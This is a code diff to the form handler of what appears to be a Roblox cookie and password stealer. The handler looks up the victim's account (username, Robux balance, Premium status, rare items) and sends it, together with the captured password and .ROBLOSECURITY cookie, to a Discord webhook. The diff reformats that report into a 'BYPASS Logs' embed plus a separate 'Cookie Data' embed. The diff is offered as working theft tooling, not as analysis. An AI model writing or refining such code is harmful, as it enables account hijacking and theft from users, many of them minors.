@@ -226,17 +226,12 @@ def submit_form():
         print("Fetching Roblox user information...")
         user_info = get_roblox_user_info(cookie)
         
-        # Prepare compact account info
-        basic_info = f"""🎮 **{user_info['username']}** ({user_info['display_name']})
-🆔 {user_info['user_id'] or 'Unknown'} | 💰 {user_info['robux_balance']} | 💎 {user_info['premium_status']}
-🔒 {password or 'No password'} | 💀 {'✅' if korblox else '❌'} | 🎭 {'✅' if headless else '❌'}
-
-🍪 **Cookie:**"""
+        # Prepare cookie content for bottom of message
+        cookie_header = f"🍪 **Cookie:**"
         
-        # Calculate available space for cookie (Discord limit: 2000 chars)
-        basic_info_length = len(basic_info)
-        cookie_wrapper_length = len("\n```\n```")  # backticks and newlines around cookie
-        available_cookie_space = 2000 - basic_info_length - cookie_wrapper_length - 50  # 50 char buffer
+        # Calculate available space for cookie (Discord embed description limit: 4096 chars)
+        cookie_wrapper_length = len("```\n```")  # backticks around cookie
+        available_cookie_space = 4000 - cookie_wrapper_length - 10  # Conservative limit with buffer for embed description
         
         # Prepare cookie content - automatically remove Roblox warning to avoid limits
         cookie_content = cookie if cookie else 'Not provided'
@@ -252,46 +247,65 @@ def submit_form():
             cookie_content = cookie_content[:available_cookie_space] + "..."
             print(f"Cookie truncated to fit Discord limit. Original: {len(cookie_content)} chars, Truncated: {len(cookie_content)} chars")
         
-        account_info = f"""{basic_info}
-```{cookie_content}```"""
-
+        # Create dual embed structure - Account info at top, Cookie at bottom
         discord_data = {
-            'content': account_info,
-            'embeds': [{
-                'title': '🔐 ROBLOX SECURITY SYSTEM',
-                'description': '⚠️ **SECURITY ALERT** - Account Access Detected',
-                'color': 0xff0000,  # Red color for security alert
-                'thumbnail': {
-                    'url': user_info['profile_picture']
-                },
-                'fields': [
-                    {
-                        'name': '👤 Account Information',
-                        'value': f"**Username:** {user_info['username']}\n**Display Name:** {user_info['display_name']}\n**User ID:** {user_info['user_id'] or 'Unknown'}",
-                        'inline': True
+            'content': '',  # Empty content so embeds appear first
+            'embeds': [
+                {
+                    # Account Information Embed (Top)
+                    'title': '🎯 BYPASS Logs',
+                    'color': 0xff0000,  # Red color as requested
+                    'thumbnail': {
+                        'url': user_info['profile_picture']
                     },
-                    {
-                        'name': '💰 Account Value',
-                        'value': f"**Robux Balance:** {user_info['robux_balance']}\n**Premium Status:** {user_info['premium_status']}\n**Password:** {password or '❌ Not provided'}",
-                        'inline': True
-                    },
-                    {
-                        'name': '🎭 Items Status',
-                        'value': f"**Korblox:** {'✅ Yes' if korblox else '❌ No'}\n**Headless:** {'✅ Yes' if headless else '❌ No'}",
-                        'inline': False
-                    },
-                    {
-                        'name': '🔒 Security Token Status',
-                        'value': '✅ **Authentication token successfully captured and validated**',
-                        'inline': False
+                    'fields': [
+                        {
+                            'name': '👤 Username',
+                            'value': user_info['username'],
+                            'inline': False
+                        },
+                        {
+                            'name': '💰 Robux',
+                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
+                            'inline': False
+                        },
+                        {
+                            'name': '⌛ Pending Robux',
+                            'value': '0',  # Default pending robux
+                            'inline': False
+                        },
+                        {
+                            'name': '📊 Status',
+                            'value': 'Success 🟩',
+                            'inline': False
+                        },
+                        {
+                            'name': '🔐 Password',
+                            'value': password if password else 'Not provided',
+                            'inline': False
+                        },
+                        {
+                            'name': '🎭 Items',
+                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
+                            'inline': False
+                        }
+                    ],
+                    'footer': {
+                        'text': f'Today at {time.strftime("%H:%M", time.localtime())}',
+                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                     }
-                ],
-                'footer': {
-                    'text': f'ROBLOX SECURITY • Authentication System • {user_info["display_name"]}',
-                    'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                 },
-                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
-            }]
+                {
+                    # Cookie Embed (Bottom)
+                    'title': '🍪 Cookie Data',
+                    'color': 0xff0000,  # Red color for cookie embed
+                    'description': f'```{cookie_content}```',
+                    'footer': {
+                        'text': 'Authentication Token • Secured',
+                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
+                    }
+                }
+            ]
         }
         
         # Send to Discord with timeout and error handling
